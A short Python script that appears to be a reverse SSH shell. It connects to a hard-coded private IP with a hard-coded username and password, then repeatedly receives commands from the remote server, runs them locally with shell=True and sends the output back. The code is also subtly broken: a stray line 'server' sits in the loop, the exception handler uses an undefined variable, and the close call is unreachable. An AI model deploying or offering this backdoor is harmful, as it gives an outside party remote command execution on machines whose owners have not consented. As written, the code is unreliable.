import threading
import paramiko
import subprocess

def ssh_command(ip, user, passwd, command):
    client = paramiko.SSHClient()
    #client.load_host_keys('~/.ssh/known_hosts')
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    client.connect(ip, username=user, password=passwd)

    ssh_session = client.get_transport().open_session()

    if ssh_session.active:
        ssh_session.exec_command(command)
        print(ssh_session.recv(1024)) # Print ssh banner

        while True:
            command = ssh_session.recv(1024) # Get command from SSH server
            server
            try:
                cmd_output = subprocess.check_output(command, shell=True)
                ssh_session.send(cmd_output)
            except:
                ssh_session.send(str(e))

        client.close()
    return

def main():
    ssh_command('192.168.1.118', 'owl', 'owldesu', 'ClientConnected')

if __name__ == '__main__':
    main()
